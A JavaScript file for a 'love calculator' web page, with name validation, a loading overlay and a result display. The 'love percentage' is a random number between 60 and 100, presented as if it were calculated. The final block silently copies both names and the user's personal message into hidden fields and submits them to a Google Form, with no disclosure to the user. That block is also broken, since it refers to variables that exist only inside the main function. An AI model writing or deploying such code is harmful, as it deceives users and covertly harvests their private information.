let canClick = true;

// 🧠 GOD MODE NAME VALIDATOR
function getNameScore(name){

    name = name.trim().toLowerCase();

    if(name.length < 3 || name.length > 30) return 0;
    if(!/^[a-z\s]+$/.test(name)) return 0;

    let score = 100;
    let words = name.split(" ").filter(w => w.length > 0);

    for(let w of words){

        if(w.length < 3) score -= 35;

        let vowels = (w.match(/[aeiou]/g) || []).length;
        let consonants = (w.match(/[bcdfghjklmnpqrstvwxyz]/g) || []).length;

        if(vowels === 0) score -= 40;
        if(consonants > vowels * 4) score -= 25;

        if(/(.)\1{3,}/.test(w)) score -= 30;
        if(/^(..)\1+$/.test(w)) score -= 35;

        let unique = new Set(w).size;
        if(unique < 4) score -= 30;
    }

    return Math.max(0, score);
}

// 🧠 SMART ERROR ENGINE
function getErrorMessage(n1, n2, love){

    let s1 = getNameScore(n1);
    let s2 = getNameScore(n2);

    if(!n1 && !n2 && !love)
        return "❌ All fields are required!";

    if(!n1)
        return "❌ Your name is required!";

    if(!n2)
        return "❌ Their name is required!";

    if(!love)
        return "❌ Please tell what you love about them!";

    if(s1 === 0 && s2 === 0)
        return "❌ Both names look fake 😭";

    if(s1 === 0)
        return "❌ Your name looks invalid 😭";

    if(s2 === 0)
        return "❌ Their name looks invalid 😭";

    if(s1 < 75 && s2 < 75)
        return "❌ Both names are too weak 😭";

    if(s1 < 75)
        return "❌ Your name doesn't look valid enough 😭";

    if(s2 < 75)
        return "❌ Their name doesn't look valid enough 😭";

    return "";
}

// 💖 MAIN FUNCTION
function calculateLove(){

    if(!canClick) return;
    canClick = false;

    let n1 = document.getElementById("name1").value.trim();
    let n2 = document.getElementById("name2").value.trim();
    let love = document.getElementById("loveText").value.trim();

    let error = document.getElementById("errorMsg");

    error.innerText = "";

    // reset UI every run (IMPORTANT FIX)
    document.getElementById("result").style.display = "none";
    document.getElementById("fill").style.width = "0%";
    document.getElementById("percent").innerText = "0%";
    document.getElementById("message").innerText = "";

    let errorMsg = getErrorMessage(n1, n2, love);

    if(errorMsg){
        error.innerText = errorMsg;
        canClick = true;
        return;
    }

    // show overlay (FIXED safe method)
    const overlay = document.getElementById("overlay");
    overlay.style.display = "flex";
    overlay.style.opacity = "1";
    overlay.style.visibility = "visible";

    setTimeout(() => {

        overlay.style.display = "none";

        let percent = Math.floor(Math.random() * 41 + 60);

        document.getElementById("result").style.display = "block";
        document.getElementById("percent").innerText = percent + "%";

        setTimeout(() => {
            document.getElementById("fill").style.width = percent + "%";
        }, 100);

        let msg =
            percent > 85 ? "💖 Perfect match! Soulmate energy!"
          : percent > 70 ? "💘 Strong connection!"
          : "💗 Good vibes! Keep going!";

        document.getElementById("message").innerText = msg;

        canClick = true;

    }, 1500);
}
// send to google form
document.getElementById("g1").value = n1;
document.getElementById("g2").value = n2;
document.getElementById("g3").value = love;

document.getElementById("googleForm").submit();
